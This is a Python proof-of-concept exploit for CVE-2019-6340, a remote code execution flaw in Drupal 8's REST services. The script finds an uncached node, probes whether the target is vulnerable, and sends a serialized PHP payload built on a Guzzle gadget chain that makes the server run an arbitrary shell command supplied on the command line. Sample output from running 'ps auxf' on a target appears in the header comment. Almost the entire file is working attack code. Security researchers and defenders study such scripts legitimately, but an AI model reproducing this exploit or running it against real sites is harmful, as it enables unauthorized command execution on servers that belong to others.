#!/usr/bin/env python3

# CVE-2019-6340 Drupal <= 8.6.9 REST services RCE PoC
# 2019 @leonjza

# Technical details for this exploit is available at:
#   https://www.drupal.org/sa-core-2019-003
#   https://www.ambionics.io/blog/drupal8-rce
#   https://twitter.com/jcran/status/1099206271901798400

# Sample usage:
#
# $ python cve-2019-6340.py http://127.0.0.1/ "ps auxf"
# CVE-2019-6340 Drupal 8 REST Services Unauthenticated RCE PoC
#  by @leonjza
#
# References:
#  https://www.drupal.org/sa-core-2019-003
#  https://www.ambionics.io/blog/drupal8-rce
#
# [warning] Caching heavily affects reliability of this exploit.
# Nodes are used as they are discovered, but once they are done,
# you will have to wait for cache expiry.
#
# Targeting http://127.0.0.1/...
# [+] Finding a usable node id...
# [x] Node enum found a cached article at: 2, skipping
# [x] Node enum found a cached article at: 3, skipping
# [+] Using node_id 4
# [+] Target appears to be vulnerable!
#
# USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
# root        49  0.0  0.0   4288   716 pts/0    Ss+  16:38   0:00 sh
# root         1  0.0  1.4 390040 30540 ?        Ss   15:20   0:00 apache2 -DFOREGROUND
# www-data    24  0.1  2.8 395652 57912 ?        S    15:20   0:08 apache2 -DFOREGROUND
# www-data    27  0.1  2.9 396152 61108 ?        S    15:20   0:08 apache2 -DFOREGROUND
# www-data    31  0.0  3.4 406304 70408 ?        S    15:22   0:04 apache2 -DFOREGROUND
# www-data    39  0.0  2.7 398472 56852 ?        S    16:14   0:02 apache2 -DFOREGROUND
# www-data    44  0.2  3.2 402208 66080 ?        S    16:37   0:05 apache2 -DFOREGROUND
# www-data    56  0.0  2.6 397988 55060 ?        S    16:38   0:01 apache2 -DFOREGROUND
# www-data    65  0.0  2.3 394252 48460 ?        S    16:40   0:01 apache2 -DFOREGROUND
# www-data    78  0.0  2.5 400996 51320 ?        S    16:47   0:01 apache2 -DFOREGROUND
# www-data   117  0.0  0.0   4288   712 ?        S    17:20   0:00  \_ sh -c echo

import sys
from urllib.parse import urlparse, urljoin

import requests


def build_url(*args) -> str:
    """
        Builds a URL
    """

    f = ''
    for x in args:
        f = urljoin(f, x)

    return f


def uri_valid(x: str) -> bool:
    """
        https://stackoverflow.com/a/38020041
    """

    result = urlparse(x)
    return all([result.scheme, result.netloc, result.path])


def check_drupal_cache(r: requests.Response) -> bool:
    """
        Check if a response had the cache header.
    """

    if 'X-Drupal-Cache' in r.headers and r.headers['X-Drupal-Cache'] == 'HIT':
        return True

    return False


def find_article(base: str, f: int = 1, l: int = 100):
    """
        Find a target article that does not 404 and is not cached
    """

    while f < l:
        u = build_url(base, '/node/', str(f))
        r = requests.get(u)

        if check_drupal_cache(r):
            print(f'[x] Node enum found a cached article at: {f}, skipping')
            f += 1
            continue

        # found an article?
        if r.status_code == 200:
            return f
        f += 1


def check(base: str, node_id: int) -> bool:
    """
        Check if the target is vulnerable.
    """

    payload = {
        "_links": {
            "type": {
                "href": f"{urljoin(base, '/rest/type/node/INVALID_VALUE')}"
            }
        },
        "type": {
            "target_id": "article"
        },
        "title": {
            "value": "My Article"
        },
        "body": {
            "value": ""
        }
    }

    u = build_url(base, '/node/', str(node_id))
    r = requests.get(f'{u}?_format=hal_json', json=payload, headers={"Content-Type": "application/hal+json"})

    if check_drupal_cache(r):
        print(f'Checking if node {node_id} is vuln returned cache HIT, ignoring')
        return False

    if 'INVALID_VALUE does not correspond to an entity on this site' in r.text:
        return True

    return False


def exploit(base: str, node_id: int, cmd: str):
    """
        Exploit using the Guzzle Gadgets
    """

    # pad a easy search replace output:
    cmd = 'echo ---- & ' + cmd
    payload = {
        "link": [
            {
                "value": "link",
                "options": "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\u0000"
                           "GuzzleHttp\\Psr7\\FnStream\u0000methods\";a:1:{s:5:\""
                           "close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:"
                           "{s:32:\"\u0000GuzzleHttp\\HandlerStack\u0000handler\";"
                           "s:|size|:\"|command|\";s:30:\"\u0000GuzzleHttp\\HandlerStack\u0000"
                           "stack\";a:1:{i:0;a:1:{i:0;s:6:\"system\";}}s:31:\"\u0000"
                           "GuzzleHttp\\HandlerStack\u0000cached\";b:0;}i:1;s:7:\""
                           "resolve\";}}s:9:\"_fn_close\";a:2:{i:0;r:4;i:1;s:7:\"resolve\";}}"
                           "".replace('|size|', str(len(cmd))).replace('|command|', cmd)
            }
        ],
        "_links": {
            "type": {
                "href": f"{urljoin(base, '/rest/type/shortcut/default')}"
            }
        }
    }

    u = build_url(base, '/node/', str(node_id))
    r = requests.get(f'{u}?_format=hal_json', json=payload, headers={"Content-Type": "application/hal+json"})

    if check_drupal_cache(r):
        print(f'Exploiting {node_id} returned cache HIT, may have failed')

    if '----' not in r.text:
        print('[warn] Command execution _may_ have failed')

    print(r.text.split('----')[1])


def main(base: str, cmd: str):
    """
        Execute an OS command!
    """

    print('[+] Finding a usable node id...')
    article = find_article(base)
    if not article:
        print('[!] Unable to find a node ID to reference. Check manually?')
        return

    print(f'[+] Using node_id {article}')

    vuln = check(base, article)
    if not vuln:
        print('[!] Target does not appear to be vulnerable.')
        print('[!] It may also simply be a caching issue, so maybe just try again later.')
        return
    print(f'[+] Target appears to be vulnerable!')

    exploit(base, article, cmd)


if __name__ == '__main__':

    print('CVE-2019-6340 Drupal 8 REST Services Unauthenticated RCE PoC')
    print(' by @leonjza\n')
    print('References:\n'
          ' https://www.drupal.org/sa-core-2019-003\n'
          ' https://www.ambionics.io/blog/drupal8-rce\n')
    print('[warning] Caching heavily affects reliability of this exploit.\n'
          'Nodes are used as they are discovered, but once they are done,\n'
          'you will have to wait for cache expiry.\n')

    if len(sys.argv) <= 2:
        print(f'Usage: {sys.argv[0]} <target base URL> <command>')
        print(f'    Example: {sys.argv[0]} http://127.0.0.1/ id')

    target = sys.argv[1]
    command = sys.argv[2]
    if not uri_valid(target):
        print(f'Target {target} is not a valid URL')
        sys.exit(1)

    print(f'Targeting {target}...')
    main(target, command)